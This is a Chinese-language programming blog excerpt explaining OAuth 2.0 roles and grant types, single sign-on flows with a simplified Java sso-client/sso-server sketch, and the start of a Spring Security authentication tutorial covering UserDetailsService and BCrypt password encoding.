<h1 id="4、Oath2-0"><a href="#4、Oath2-0" class="headerlink" title="4、Oath2.0"></a>4、Oath2.0</h1><p>OAuth 是一个行业的<strong>标准授权协议</strong>，主要用来授权第三方应用获取有限的权限。而 OAuth 2.0 是对 OAuth 1.0 的完全重新设计，OAuth 2.0 更快，更容易实现，OAuth 1.0 已经被废弃。</p>
<blockquote>
<p>实际上它就是一种授权机制，它的最终目的是为第三方应用颁发一个有时效性的令牌 token，使得第三方应用能够通过该令牌获取相关的资源。</p>
</blockquote>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>OAuth 2.0 比较常用的场景就是第三方登录，当你的网站接入了第三方登录的时候一般就是使用的 OAuth 2.0 协议。</p>
<p>OAuth 2.0也常见于支付场景（微信支付、支付宝支付）和开发平台（微信开放平台、阿里开放平台等等）。</p>
<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p><img src="https://csn.damyoung.cn/image-20201208193803706.png" alt="image-20201208193803706"></p>
<h3 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>本身不存储资源，需要通过资源拥有者的授权去请求资源服务器的资源，比如：Android客户端、Web 客户端（浏览器端）、微信客户端等。</p>
<h4 id="资源拥有者"><a href="#资源拥有者" class="headerlink" title="资源拥有者"></a>资源拥有者</h4><p>通常为用户，也可以是应用程序，即该资源的拥有者。 </p>
<h4 id="授权服务器（也称认证服务器）"><a href="#授权服务器（也称认证服务器）" class="headerlink" title="授权服务器（也称认证服务器）"></a>授权服务器（也称认证服务器）</h4><p>用来对资源拥有的身份进行认证、对访问资源进行授权。客户端要想访问资源需要通过认证服务器由资 源拥有者授权后方可访问。 </p>
<h4 id="资源服务器"><a href="#资源服务器" class="headerlink" title="资源服务器"></a>资源服务器</h4><p>存储资源的服务器，比如，网站用户管理服务器存储了网站用户信息，网站相册服务器存储了用户的相 册信息，微信的资源服务存储了微信的用户信息等。客户端最终访问资源服务器获取资源信息。 </p>
<h3 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h3><ul>
<li>客户凭证(client Credentials) ：客户端的clientId和密码用于认证客户 </li>
<li>令牌(tokens) ：授权服务器在接收到客户请求后，颁发的访问令牌 </li>
<li>作用域(scopes) ：客户请求访问令牌时，由资源拥有者额外指定的细分权限(permission)</li>
</ul>
<h3 id="令牌类型"><a href="#令牌类型" class="headerlink" title="令牌类型"></a>令牌类型</h3><ul>
<li>授权码 ：仅用于授权码授权类型，用于交换获取访问令牌和刷新令牌 </li>
<li>访问令牌 ：用于代表一个用户或服务直接去访问受保护的资源 </li>
<li>刷新令牌 ：用于去授权服务器获取一个刷新访问令牌 </li>
<li>BearerToken ：不管谁拿到Token都可以访问资源，类似现金 Proof of Possession(PoP) </li>
<li>Token ：可以校验client是否对Token有明确的拥有权</li>
</ul>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
<li>更安全，客户端不接触用户密码，服务器端更易集中保护  </li>
<li>短寿命和封装的token </li>
<li>资源服务器和授权服务器解耦 集中式授权，简化客户端 HTTP/JSON友好，易于请求和传递token </li>
</ul>
<h2 id="授权模式"><a href="#授权模式" class="headerlink" title="授权模式"></a>授权模式</h2><h3 id="授权码模式"><a href="#授权码模式" class="headerlink" title="授权码模式"></a>授权码模式</h3><p><img src="https://csn.damyoung.cn/image-20201217221851931.png" alt="image-20201217221851931"></p>
<ul>
<li>简化</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201217221906964.png" alt="image-20201217221906964"></p>
<h3 id="密码模式"><a href="#密码模式" class="headerlink" title="密码模式"></a>密码模式</h3><p><img src="https://csn.damyoung.cn/image-20201217221922475.png" alt="image-20201217221922475"></p>
<h3 id="客户端模式"><a href="#客户端模式" class="headerlink" title="客户端模式"></a>客户端模式</h3><p><img src="https://csn.damyoung.cn/image-20201217221930211.png" alt="image-20201217221930211"></p>
<h1 id="5、单点登录SSO"><a href="#5、单点登录SSO" class="headerlink" title="5、单点登录SSO"></a>5、单点登录SSO</h1><blockquote>
<p>OAuth 是一个行业的标准授权协议，主要用来授权第三方应用获取有限的权限。SSO 解决的是一个公司的多个相关的子系统的之间的登陆问题比如京东旗下相关子系统京东金融、京东超市、京东家电等等。</p>
</blockquote>
<p>单点登录（SSO，Single Sign On）就是在多个系统中，用户只需一次登录，各个系统即可感知该用户已经登录</p>
<p>相比于单系统登录，sso 需要一个<strong>独立的认证中心</strong>，只有认证中心能接受用户的用户名密码等安全信息，其他系统不提供登录入口，只接受认证中心的<strong>间接授权</strong>。</p>
<p>间接授权通过令牌（tokens）实现，sso 认证中心验证用户的用户名密码没问题，创建授权令牌，在接下来的跳转过程中，授权令牌作为参数发送给各个子系统，子系统拿到令牌，即得到了授权，可以借此创建局部会话，局部会话登录方式与单系统的登录方式相同。</p>
<h2 id="单点登录原理"><a href="#单点登录原理" class="headerlink" title="单点登录原理"></a>单点登录原理</h2><blockquote>
<p>如何创建全局会话的？<br>答：sso认证中心校验用户信息，创建用户与 sso 认证中心之间的会话，称为全局会话），创建授权令牌 tokens,接着有了 tokens 令牌之后就可以跳转到系统1的地址了，这个时候系统1向 sso 认证中心校验令牌有效，sso 认证中心把系统1的地址注册到 sso 认证中心上，然后返回给系统1，令牌有效，于是浏览器就可以访问系统1了。<br>再接着如果浏览器要访问系统2的话，在系统2上一验证，发现没有登录，这个时候就带着系统2的地址跳去 sso 认证中心，sso认证中心上验证已经登录，于是把令牌 tokens 发送给系统2，这个时候系统2再次带着系统2的地址和令牌来到 sso 认证中心验证时，令牌肯定是有效的，然后 sso 中心把系统2的地址注册到本地上，接着告诉系统2，令牌有效，于是浏览器就可以和系统2进行局部会话了</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/20190310104505649.png" alt="单点登录原理"></p>
<h2 id="登录流程"><a href="#登录流程" class="headerlink" title="登录流程"></a>登录流程</h2><ul>
<li>浏览器首先访问系统1，系统1检测到用户没有登录。</li>
<li>于是带上系统1的地址转发到 sso 认证中心，也发现没有登录，</li>
<li>于是带上系统1的地址来到登录页面进行登录，登录完毕之后，sso 认证中心就开始创建<strong>全局会话</strong></li>
</ul>
<p><img src="https://csn.damyoung.cn/20190310110616439.png" alt="单点登录过程"></p>
<h2 id="注销登录过程"><a href="#注销登录过程" class="headerlink" title="注销登录过程"></a>注销登录过程</h2><p><img src="https://csn.damyoung.cn/20190310112749341.png" alt="单点登录注销登录过程"></p>
<p><img src="https://csn.damyoung.cn/201903101128293.png" alt="单点登录注销登录流程说明"></p>
<h1 id="6、项目实现单点登录"><a href="#6、项目实现单点登录" class="headerlink" title="6、项目实现单点登录"></a>6、项目实现单点登录</h1><blockquote>
<p>sso采用客户端/服务端架构，我们先看sso-client与sso-server要实现的功能。</p>
</blockquote>
<p><strong>sso-client</strong></p>
<ol>
<li>拦截子系统未登录用户请求，跳转至sso认证中心；</li>
<li>接收并存储sso认证中心发送的令牌；</li>
<li>与sso-server通信，校验令牌的有效性；</li>
<li>建立局部会话；</li>
<li>拦截用户注销请求，向sso认证中心发送注销请求；</li>
<li>接收sso认证中心发出的注销请求，销毁局部会话。</li>
</ol>
<p><strong>sso-server</strong></p>
<ol>
<li>验证用户的登录信息；</li>
<li>创建全局会话；</li>
<li>创建授权令牌；</li>
<li>与sso-client通信发送令牌；</li>
<li>校验sso-client令牌有效性；</li>
<li>系统注册；</li>
<li>接收sso-client注销请求，注销所有会话。</li>
</ol>
<p>接下来，我们按照原理来一步步实现sso吧！</p>
<h3 id="sso-client拦截未登录请求"><a href="#sso-client拦截未登录请求" class="headerlink" title="sso-client拦截未登录请求"></a><strong>sso-client拦截未登录请求</strong></h3><p>Java拦截请求的方式有servlet、filter、listener三种方式，我们采用filter。在sso-client中新建LoginFilter.java类并实现Filter接口，在doFilter()方法中加入对未登录用户的拦截。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest req = (HttpServletRequest) request;</span><br><span class="line">    HttpServletResponse res = (HttpServletResponse) response;</span><br><span class="line">    HttpSession session = req.getSession();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;isLogin&quot;</span>)) &#123;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//跳转至sso认证中心</span></span><br><span class="line">    res.sendRedirect(<span class="string">&quot;sso-server-url-with-system-url&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sso-server拦截未登录请求"><a href="#sso-server拦截未登录请求" class="headerlink" title="sso-server拦截未登录请求"></a><strong>sso-server拦截未登录请求</strong></h3><p>拦截从sso-client跳转至sso认证中心的未登录请求，跳转至登录页面，这个过程与sso-client完全一样。</p>
<h3 id="sso-server验证用户登录信息"><a href="#sso-server验证用户登录信息" class="headerlink" title="sso-server验证用户登录信息"></a><strong>sso-server验证用户登录信息</strong></h3><p>用户在登录页面输入用户名密码，请求登录，sso认证中心校验用户信息，校验成功，将会话状态标记为“已登录”。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(String username, String password, HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.checkLoginInfo(username, password);</span><br><span class="line">    req.getSession().setAttribute(<span class="string">&quot;isLogin&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sso-server创建授权令牌"><a href="#sso-server创建授权令牌" class="headerlink" title="sso-server创建授权令牌"></a><strong>sso-server创建授权令牌</strong></h3><p>授权令牌是一串随机字符，以什么样的方式生成都没有关系，只要不重复、不易伪造即可，下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String token &#x3D; UUID.randomUUID().toString();</span><br></pre></td></tr></table></figure>

<h3 id="sso-client取得令牌并校验"><a href="#sso-client取得令牌并校验" class="headerlink" title="sso-client取得令牌并校验"></a><strong>sso-client取得令牌并校验</strong></h3><p>sso认证中心登录后，跳转回子系统并附上令牌，子系统（sso-client）取得令牌，然后去sso认证中心校验，在LoginFilter.java的doFilter()中添加几行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求附带token参数</span></span><br><span class="line">String token = req.getParameter(<span class="string">&quot;token&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (token != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 去sso认证中心校验token</span></span><br><span class="line">    <span class="keyword">boolean</span> verifyResult = <span class="keyword">this</span>.verify(<span class="string">&quot;sso-server-verify-url&quot;</span>, token);</span><br><span class="line">    <span class="keyword">if</span> (!verifyResult) &#123;</span><br><span class="line">        res.sendRedirect(<span class="string">&quot;sso-server-url&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>verify()方法使用httpClient实现，这里仅简略介绍，httpClient详细使用方法请参考官方文档。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HttpPost httpPost &#x3D; new HttpPost(&quot;sso-server-verify-url-with-token&quot;);</span><br><span class="line">HttpResponse httpResponse &#x3D; httpClient.execute(httpPost);</span><br></pre></td></tr></table></figure>

<h3 id="sso-server接收并处理校验令牌请求"><a href="#sso-server接收并处理校验令牌请求" class="headerlink" title="sso-server接收并处理校验令牌请求"></a><strong>sso-server接收并处理校验令牌请求</strong></h3><p>用户在sso认证中心登录成功后，sso-server创建授权令牌并存储该令牌，所以，sso-server对令牌的<strong>校验就是去查找这个令牌是否存在以及是否过期</strong>，令牌校验成功后sso-server将发送校验请求的<strong>系统注册</strong>到sso认证中心（就是存储起来的意思）。</p>
<p>令牌与注册系统地址通常存储在key-value数据库（如redis）中，redis可以为key设置有效时间也就是令牌的有效期。redis运行在内存中，速度非常快，正好sso-server不需要持久化任何数据。</p>
<p>令牌与注册系统地址可以用下图描述的结构存储在redis中，可能你会问，为什么要存储这些系统的地址？如果不存储，注销的时候就麻烦了，用户向sso认证中心提交注销请求，sso认证中心注销全局会话，但不知道哪些系统用此全局会话建立了自己的局部会话，也不知道要向哪些子系统发送注销请求注销局部会话。</p>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xNTQ2MjA1Ny1lZDA3ZGI2NDBjMDZiOWZkLnBuZw" alt="img"></p>
<h3 id="sso-client校验令牌成功创建局部会话"><a href="#sso-client校验令牌成功创建局部会话" class="headerlink" title="sso-client校验令牌成功创建局部会话"></a><strong>sso-client校验令牌成功创建局部会话</strong></h3><p>令牌校验成功后，sso-client将当前局部会话标记为“已登录”，修改LoginFilter.java，添加几行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (verifyResult) &#123;</span><br><span class="line">    session.setAttribute(<span class="string">&quot;isLogin&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sso-client还需将当前会话id与令牌绑定，表示这个会话的登录状态与令牌相关</strong>，此关系可以用java的hashmap保存，保存的数据用来处理sso认证中心发来的注销请求。</p>
<h3 id="注销过程"><a href="#注销过程" class="headerlink" title="注销过程"></a><strong>注销过程</strong></h3><p>用户向子系统发送带有“logout”参数的请求（注销请求），sso-client拦截器拦截该请求，向sso认证中心发起注销请求。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String logout = req.getParameter(<span class="string">&quot;logout&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (logout != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.ssoServer.logout(token);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>sso认证中心也用同样的方式识别出sso-client的请求是注销请求（带有“logout”参数），sso认证中心注销全局会话。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/logout&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">logout</span><span class="params">(HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">    HttpSession session = req.getSession();</span><br><span class="line">    <span class="keyword">if</span> (session != <span class="keyword">null</span>) &#123;</span><br><span class="line">        session.invalidate();<span class="comment">//触发LogoutListener</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sso认证中心有一个全局会话的监听器，一旦全局会话注销，将通知所有注册系统注销。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogoutListener</span> <span class="keyword">implements</span> <span class="title">HttpSessionListener</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionCreated</span><span class="params">(HttpSessionEvent event)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionDestroyed</span><span class="params">(HttpSessionEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//通过httpClient向所有注册系统发送注销请求</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>项目</tag>
        <tag>单点登录</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Security</title>
    <url>/2020/11/25/05springSecurity/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>使用安全框架，我们可以通过配置的方式实现对资源的访问限制</p>
<h2 id="常用安全框架"><a href="#常用安全框架" class="headerlink" title="常用安全框架"></a>常用安全框架</h2><ul>
<li>Spring Security：Spring家族一员。是一个能够为基于Spring的企业应用系统提供声明式的安全访问控制解决方案的安全框架。它提供了一组可以在Spring应用上下文中配置的Bean，充分利用了 Spring IoC ， DI（控制反转Inversion of Control,DI:Dependency Injection 依赖注入） 和 AOP（面向切面编程） 功能，为应用系统提供声明式的安全访问控制功能，减少了为企业系统安 全控制编写大量重复代码的工作。 </li>
<li>Apache Shiro：一个功能强大且易于使用的Java安全框架,提供了认证,授权,加密,和会话管理</li>
</ul>
<h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h3><ul>
<li>“<strong>认证</strong>”，是建立一个他声明的主体的过程（一个“主体”一般是指用户， 设备或一些可以在你的应用程序中执行动作的其他系统），通俗点说就是系统认为用户是否能登录。 </li>
<li>“<strong>授权</strong>”指确定一个主体是否允许在你的应用程序执行一个动作的过程。通俗点讲就是系统判断用户是否 有权限去做某些事情。</li>
</ul>
<a id="more"></a>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--       security组件 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--      web组件 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="UserDetailService"><a href="#UserDetailService" class="headerlink" title="UserDetailService"></a>UserDetailService</h3><p>当什么也没有配置的时候，账号和密码是由 Spring Security 定义生成的。</p>
<p>而在实际项目中账号和密 码都是从数据库中查询出来的。所以我们要通过自定义逻辑控制认证逻辑。如果需要自定义逻辑时，只需要实现 UserDetailsService 接口即可</p>
<p><img src="https://csn.damyoung.cn/image-20201207205504951.png" alt="image-20201207205504951"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDetailsService</span> </span>&#123;</span><br><span class="line">   <span class="function">UserDetails <span class="title">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDetails</span> <span class="keyword">extends</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="comment">//获得所有权限，不能返回null</span></span><br><span class="line">   Collection&lt;? extends GrantedAuthority&gt; getAuthorities();</span><br><span class="line">    </span><br><span class="line">   <span class="function">String <span class="title">getPassword</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="function">String <span class="title">getUsername</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//账户是否未过期，过期false</span></span><br><span class="line">   <span class="function"><span class="keyword">boolean</span> <span class="title">isAccountNonExpired</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//账户是否未锁定</span></span><br><span class="line">   <span class="function"><span class="keyword">boolean</span> <span class="title">isAccountNonLocked</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//凭证(密码)是否过期</span></span><br><span class="line">   <span class="function"><span class="keyword">boolean</span> <span class="title">isCredentialsNonExpired</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//账户是否启用</span></span><br><span class="line">   <span class="function"><span class="keyword">boolean</span> <span class="title">isEnabled</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User</p>
<p>UserDetails 实现类 User 类的实例。而三个参数的构造方法实际上也是调用 7 个参数的构造方法。 username :用户名 password :密码 <strong>authorities</strong> ：用户具有的权限。此处不允许为 null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//UserDetails的实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">UserDetails</span>, <span class="title">CredentialsContainer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String username;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Set&lt;GrantedAuthority&gt; authorities;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> accountNonExpired;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> accountNonLocked;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> credentialsNonExpired;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> enabled;</span><br><span class="line">    </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username, String password, <span class="keyword">boolean</span> enabled, <span class="keyword">boolean</span> accountNonExpired, <span class="keyword">boolean</span> credentialsNonExpired, <span class="keyword">boolean</span> accountNonLocked, Collection&lt;? extends GrantedAuthority&gt; authorities)</span> </span>&#123;</span><br><span class="line">   <span class="comment">//.....</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处的用户名应该是客户端传递过来的用户名。而密码应该是从数据库中查询出来的密码。Spring Security 会根据 User 中的 password 和客户端传递过来的 password 进行比较。如果相同则表示认证 通过，如果不相同表示认证失败</p>
<p>里面的权限对于后面学习授权是很有必要的，包含的所有内容为此用户具有的权限， 如有里面没有包含某个权限，而在做某个事情时必须包含某个权限则会出现 403。通常都是通过 AuthorityUtils.commaSeparatedStringToAuthorityList(“”) 来创建 authorities 集合对象 的。参数是一个字符串，多个权限使用逗号分隔。</p>
<h3 id="密码比较器"><a href="#密码比较器" class="headerlink" title="密码比较器"></a>密码比较器</h3><p>Spring Security 要求容器中必须有 PasswordEncoder 实例。所以当自定义登录逻辑时要求必须给容 器注入 PaswordEncoder 的bean对象。</p>
<p>BCryptPasswordEncoder 是 Spring Security 官方推荐的密码解析器，平时多使用这个解析器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PasswordEncoder</span> </span>&#123;</span><br><span class="line"><span class="comment">//对password加密</span></span><br><span class="line">   <span class="function">String <span class="title">encode</span><span class="params">(CharSequence rawPassword)</span></span>;</span><br><span class="line"><span class="comment">//匹配rewPassword:客户端传回的明文密码 encodePassword:密文</span></span><br><span class="line">   <span class="function"><span class="keyword">boolean</span> <span class="title">matches</span><span class="params">(CharSequence rawPassword, String encodedPassword)</span></span>;</span><br><span class="line">    </span><br><span class="line">   <span class="function"><span class="keyword">default</span> <span class="keyword">boolean</span> <span class="title">upgradeEncoding</span><span class="params">(String encodedPassword)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextLoads</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//密码比较器PasswordEncoder接口的实现</span></span><br><span class="line">    <span class="comment">// 加密以salt的形式进行加密，以求每次对同一密码都得到不同密文</span></span><br><span class="line">    BCryptPasswordEncoder bCryptPasswordEncoder = <span class="keyword">new</span> BCryptPasswordEncoder();</span><br><span class="line">    <span class="comment">//生成加密的密码</span></span><br><span class="line">    String encode = bCryptPasswordEncoder.encode(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    System.out.println(encode);</span><br><span class="line">    System.out.println(bCryptPasswordEncoder.encode(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">    <span class="comment">//匹配</span></span><br><span class="line">    <span class="keyword">boolean</span> matches = bCryptPasswordEncoder.matches(<span class="string">&quot;123&quot;</span>, encode);</span><br><span class="line">    System.out.println(matches);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h3><blockquote>
<p>鉴权对象接口</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Authentication</span> <span class="keyword">extends</span> <span class="title">Principal</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="comment">//获取权限</span></span><br><span class="line">   Collection&lt;? extends GrantedAuthority&gt; getAuthorities();</span><br><span class="line"><span class="comment">//获取凭证(密码)</span></span><br><span class="line">   <span class="function">Object <span class="title">getCredentials</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//获得详情</span></span><br><span class="line">   <span class="function">Object <span class="title">getDetails</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//获取对象，UserDetails</span></span><br><span class="line">   <span class="function">Object <span class="title">getPrincipal</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//是否被认证</span></span><br><span class="line">   <span class="function"><span class="keyword">boolean</span> <span class="title">isAuthenticated</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//设置认证</span></span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">setAuthenticated</span><span class="params">(<span class="keyword">boolean</span> isAuthenticated)</span> <span class="keyword">throws</span> IllegalArgumentException</span>;</span><br></pre></td></tr></table></figure>

<h3 id="AuthenticationException"><a href="#AuthenticationException" class="headerlink" title="AuthenticationException"></a>AuthenticationException</h3><blockquote>
<p>鉴权异常抽象类</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthenticationException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">AuthenticationException</span><span class="params">(String msg, Throwable cause)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>(msg, cause);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">AuthenticationException</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>(msg);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="自定义登录逻辑"><a href="#自定义登录逻辑" class="headerlink" title="自定义登录逻辑"></a>自定义登录逻辑</h2><ul>
<li>将<code>PasswordEncoder</code>注册到Spring容器中</li>
<li>继承覆写<code>UserDetailsService</code>接口中的<code>loadUserByUsername</code>方法</li>
<li>返回<code>org.springframework.security.core.userdetails.User</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecurityConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将PasswordEncoder注册到spring容器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 实现类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PasswordEncoder <span class="title">getPw</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> BCryptPasswordEncoder();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

